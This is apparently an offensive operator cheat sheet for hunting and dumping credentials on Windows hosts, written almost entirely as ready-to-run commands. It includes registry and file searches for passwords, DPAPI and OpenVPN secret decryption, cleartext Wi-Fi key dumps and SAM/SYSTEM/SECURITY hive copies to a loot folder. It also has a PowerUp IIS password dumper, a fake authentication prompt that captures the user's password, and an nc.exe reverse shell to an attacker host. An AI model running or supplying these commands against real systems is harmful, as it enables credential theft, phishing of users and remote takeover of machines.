---
technique: Windows Local Credential Hunting
category: credential-access
targets: Windows Workstation, Windows Server
protocols: Local
remote_capable: false
tags: windows credentials registry dpapi wifi putty unattended iis
---

# Windows Local Credential Hunting

Windows hosts often contain plaintext secrets, DPAPI blobs, saved Wi-Fi keys, unattended install files, application configs, registry values, and tool-specific credential stores. Start with low-impact discovery before dumping protected stores.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Shell access | Most commands run as the current local user |
| File visibility | Some paths require hidden-file access or administrative rights |
| Loot path | Save high-volume output to a controlled directory when needed |

## Windows

### Winlogon credentials

#cmd #registry #autologon

Search Winlogon for autologon credential values.

```cmd title:"Search Winlogon for credential values"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
```
<!-- cheat -->

### HKLM password search

#cmd #registry

Search HKLM registry string values for password references.

```cmd title:"Search HKLM registry for password strings"
reg query HKLM /f password /t REG_SZ /s
```
<!-- cheat -->

### HKCU password search

#cmd #registry

Search HKCU registry string values for password references.

```cmd title:"Search HKCU registry for password strings"
reg query HKCU /f password /t REG_SZ /s
```
<!-- cheat -->

### PowerShell history

#powershell #history

Read the current user's PSReadLine command history.

```powershell title:"Read PowerShell command history"
Get-Content (Get-PSReadLineOption).HistorySavePath
```
<!-- cheat -->

### DPAPI master keys

#powershell #dpapi

List user DPAPI master key directories.

```powershell title:"List roaming DPAPI master keys"
Get-ChildItem $env:APPDATA\Microsoft\Protect\
```
<!-- cheat -->

### DPAPI credential blobs

#powershell #dpapi

List user DPAPI credential blobs.

```powershell title:"List local DPAPI credential blobs"
Get-ChildItem -Hidden $env:LOCALAPPDATA\Microsoft\Credentials\
```
<!-- cheat -->

### Wi-Fi profiles

#cmd #wifi

List saved Wi-Fi profiles.

```cmd title:"List saved Wi-Fi profiles"
netsh wlan show profile
```
<!-- cheat -->

### Wi-Fi password

#cmd #wifi

Reveal the saved Wi-Fi key for a specific SSID.

```cmd title:"Reveal saved Wi-Fi password"
netsh wlan show profile "$ssid" key=clear
```
<!-- cheat
var ssid
-->

### PuTTY sessions

#cmd #registry #putty

Search saved PuTTY sessions for hosts, usernames, proxy settings, and key paths.

```cmd title:"Search PuTTY sessions for credential material"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername"
```
<!-- cheat -->

### Find unattended files

#cmd #unattend

Find unattended setup files that may contain local administrator credentials.

```cmd title:"Find unattended setup files"
dir /s /b C:\*sysprep.inf C:\*sysprep.xml C:\*unattended.xml C:\*unattend.xml C:\*unattend.txt 2>nul
```
<!-- cheat -->

### Find credential files

#cmd #files

Search common credential-bearing filenames across `C:\`.

```cmd title:"Find common credential-bearing files"
dir /s /b C:\*password* C:\*cred* C:\*.kdbx C:\web.config C:\unattend.xml C:\sysprep.xml 2>nul
```
<!-- cheat -->

### Find IIS web.config

#powershell #iis

Find IIS `web.config` files.

```powershell title:"Find IIS web.config files"
Get-ChildItem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
<!-- cheat -->

### Read IIS connection strings

#cmd #iis

Search the .NET framework config for connection strings.

```cmd title:"Read IIS connection strings"
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
<!-- cheat -->

## Linux

No Linux operator command is included here. This note covers local Windows credential discovery commands.

## Additional Windows Credential Commands

## Windows Credentials

### Winlogon registry dump

```cmd title:"Dump all Winlogon credential-bearing values via findstr"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
```
<!-- cheat -->

### Winlogon DefaultUserName

```cmd title:"Read Winlogon DefaultUserName value"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
```
<!-- cheat -->

### Winlogon DefaultPassword

```cmd title:"Read Winlogon DefaultPassword value (autologon plaintext)"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```
<!-- cheat -->

### runas /savecred

```cmd title:"Run remote binary using saved Credential Manager creds"
runas /savecred /user:$user "\\$host\$share\$file"
```
<!-- cheat
var user
var host
var share
var file
-->

### runas with creds

```cmd title:"Run command as another user with explicit creds"
C:\Windows\System32\runas.exe /env /noprofile /user:$user $pass "c:\users\Public\nc.exe -nc $lhost $lport -e cmd.exe"
```
<!-- cheat
import tun_ip
import lports
var user
var pass
-->

### DPAPI master keys (Roaming)

```powershell title:"List DPAPI master keys in roaming AppData"
Get-ChildItem $env:APPDATA\Microsoft\Protect\
```
<!-- cheat -->

### DPAPI master keys (Local)

```powershell title:"List DPAPI master keys in local AppData"
Get-ChildItem $env:LOCALAPPDATA\Microsoft\Protect\
```
<!-- cheat -->

### DPAPI cred blobs (Local)

```powershell title:"List DPAPI credential blobs in local AppData"
Get-ChildItem -Hidden $env:LOCALAPPDATA\Microsoft\Credentials\
```
<!-- cheat -->

### DPAPI cred blobs (Roaming)

```powershell title:"List DPAPI credential blobs in roaming AppData"
Get-ChildItem -Hidden $env:APPDATA\Microsoft\Credentials\
```
<!-- cheat -->

### decrypt PS credential file

```powershell title:"Decrypt Import-Clixml PSCredential file and reveal plaintext"
$credential = Import-Clixml -Path $cred_file; $credential.GetNetworkCredential() | fl
```
<!-- cheat
var cred_file
-->

### Wi-Fi profiles 2

```cmd title:"List saved Wi-Fi profiles via netsh"
netsh wlan show profile
```
<!-- cheat -->

### Wi-Fi password 2

```cmd title:"Reveal cleartext Wi-Fi password for a specific SSID"
netsh wlan show profile $ssid key=clear
```
<!-- cheat
var ssid
-->

### dump all Wi-Fi passwords

```cmd title:"Iterate every Wi-Fi profile and dump cleartext passwords"
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```
<!-- cheat -->

### RunMRU

```cmd title:"Read RunMRU recent commands from explorer"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
```
<!-- cheat -->

### RDCMan settings

```cmd title:"Read RDCMan settings file with stored RDP creds"
type %localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
<!-- cheat -->

### IIS appcmd cred dump (PowerUp)

```powershell title:"Dump IIS app pool and vdir credentials via appcmd (PowerUp)"
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        $DataTable = New-Object System.Data.DataTable
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {
            $PoolName = $_
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {
            $VdirName = $_
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        if( $DataTable.rows.Count -gt 0 ) {
            $DataTable | Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else { Write-Verbose 'No application pool or virtual directory passwords were found.'; $False }
    }
    else { Write-Verbose 'Appcmd.exe does not exist in the default location.'; $False }
    $ErrorActionPreference = $OrigError
}
```
<!-- cheat -->

### SCCM apps

```powershell title:"List installed SCCM applications via WMI"
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion; if ($result) { $result } else { Write "Not Installed." }
```
<!-- cheat -->


## Additional File and Registry Credential Hunting Commands

## Files and Registry (Credentials)

### PuTTY sessions 2

```cmd title:"Search PuTTY session registry for credentials and proxy info"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername"
```
<!-- cheat -->

### PuTTY host keys

```cmd title:"List PuTTY-cached SSH host keys"
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
<!-- cheat -->

### OpenSSH agent keys

```cmd title:"Read OpenSSH agent keys from registry"
reg query HKCU\Software\OpenSSH\Agent\Keys
```
<!-- cheat -->

### enable ssh-agent

```powershell title:"Set ssh-agent to auto-start and start the service"
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
<!-- cheat -->

### find unattended files

```cmd title:"Recursively find unattended/sysprep files on C:\"
dir /s /b C:\*sysprep.inf C:\*sysprep.xml C:\*unattended.xml C:\*unattend.xml C:\*unattend.txt 2>nul
```
<!-- cheat -->

### read unattended files

```cmd title:"Read every known unattended/sysprep credential file"
for %f in ("C:\Windows\sysprep\sysprep.xml" "C:\Windows\sysprep\sysprep.inf" "C:\Windows\sysprep.inf" "C:\Windows\Panther\Unattended.xml" "C:\Windows\Panther\Unattend.xml" "C:\Windows\Panther\Unattend\Unattend.xml" "C:\Windows\Panther\Unattend\Unattended.xml" "C:\Windows\System32\Sysprep\unattend.xml" "C:\Windows\System32\Sysprep\unattended.xml" "C:\unattend.txt" "C:\unattend.inf") do @if exist %f echo === %f === & type %f
```
<!-- cheat -->

### copy SAM/SYSTEM backups

```cmd title:"Copy SAM and SYSTEM hive backups to loot dir if accessible"
for %f in ("%SYSTEMROOT%\repair\SAM" "%SYSTEMROOT%\System32\config\RegBack\SAM" "%SYSTEMROOT%\System32\config\SAM" "%SYSTEMROOT%\repair\system" "%SYSTEMROOT%\System32\config\SYSTEM" "%SYSTEMROOT%\System32\config\RegBack\system") do @if exist %f copy %f $loot_dir\
```
<!-- cheat
var loot_dir
-->

### reg save hives (admin)

```cmd title:"Save SAM/SYSTEM/SECURITY hives via reg save (requires admin)"
reg save HKLM\SAM $loot_dir\sam.hive & reg save HKLM\SYSTEM $loot_dir\system.hive & reg save HKLM\SECURITY $loot_dir\security.hive
```
<!-- cheat
var loot_dir
-->

### read cloud creds

```cmd title:"Read AWS/GCP/Azure credential files from common locations"
for %f in ("%USERPROFILE%\.aws\credentials" "%APPDATA%\gcloud\credentials.db" "%APPDATA%\gcloud\legacy_credentials" "%APPDATA%\gcloud\access_tokens.db" "%USERPROFILE%\.azure\accessTokens.json" "%USERPROFILE%\.azure\azureProfile.json") do @if exist %f echo === %f === & type %f
```
<!-- cheat -->

### gpp-decrypt

```cmd title:"Decrypt cached Group Policy Preferences cpassword value"
gpp-decrypt $cpassword
```
<!-- cheat
var cpassword
-->

### find IIS web.config

```powershell title:"Recursively find web.config under C:\inetpub"
Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
<!-- cheat -->

### IIS connectionString

```cmd title:"Read .NET machine.config and grep for connectionString"
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
<!-- cheat -->

### find XAMPP web.config

```powershell title:"Recursively find web.config under C:\xampp"
Get-Childitem -Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
<!-- cheat -->

### OpenVPN GUI creds

```powershell title:"Decrypt OpenVPN GUI saved credentials via DPAPI"
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}
foreach ($item in $items) {
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]
  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes, $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
<!-- cheat -->

### IIS logs

```cmd title:"List IIS log files"
dir C:\inetpub\logs\LogFiles\
```
<!-- cheat -->

### find webserver logs

```powershell title:"Find access.log/error.log under C:\ recursively"
Get-Childitem -Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
<!-- cheat -->

### prompt for creds

```powershell title:"Pop a fake credential prompt and reveal the entered plaintext"
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
```
<!-- cheat -->

### find credential files

```cmd title:"Search C:\ for known credential-bearing filenames"
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg == *.pgp == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12 == *.cer == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == ntuser.dat 2>nul | findstr /v ".dll"
```
<!-- cheat -->

### find unattend (powershell)

```powershell title:"Find unattend/sysprep config files via Get-Childitem"
Get-Childitem -Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
<!-- cheat -->

### WinVNC password

```cmd title:"Read ORL WinVNC password from registry"
reg query "HKCU\Software\ORL\WinVNC3\Password"
```
<!-- cheat -->

### SNMP service

```cmd title:"Read SNMP service registry recursively"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
```
<!-- cheat -->

### TightVNC server

```cmd title:"Read TightVNC server settings from registry"
reg query "HKCU\Software\TightVNC\Server"
```
<!-- cheat -->

### grep config files for password

```cmd title:"Grep xml/ini/txt/config files for the string password"
findstr /si password *.xml *.ini *.txt *.config
```
<!-- cheat -->

### grep all files for password

```cmd title:"Grep every file recursively for the string password"
findstr /spin "password" *.*
```
<!-- cheat -->

### locate file

```cmd title:"Locate a specific filename anywhere on C:\"
where /R C:\ $file
```
<!-- cheat
var file
-->

### registry search HKLM (keys)

```cmd title:"Search HKLM key names for password"
REG QUERY HKLM /F "password" /t REG_SZ /S /K
```
<!-- cheat -->

### registry search HKCU (keys)

```cmd title:"Search HKCU key names for password"
REG QUERY HKCU /F "password" /t REG_SZ /S /K
```
<!-- cheat -->

### registry search HKLM (data)

```cmd title:"Search HKLM REG_SZ values for password"
REG QUERY HKLM /F "password" /t REG_SZ /S /d
```
<!-- cheat -->

### registry search HKCU (data)

```cmd title:"Search HKCU REG_SZ values for password"
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
<!-- cheat -->

### SessionGopher (local)

```powershell title:"Run SessionGopher locally for saved RDP/PuTTY/WinSCP/FileZilla creds"
Import-Module $module_path; Invoke-SessionGopher -Thorough
```
<!-- cheat
var module_path
-->

### SessionGopher (domain)

```powershell title:"Run SessionGopher across the domain with provided creds"
Invoke-SessionGopher -AllDomain -u $domain\$user -p $pass
```
<!-- cheat
var domain
var user
var pass
-->

## Misc

### monitor process command lines

```powershell title:"Continuously diff process command lines to catch creds in argv"
while($true) {
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
<!-- cheat -->

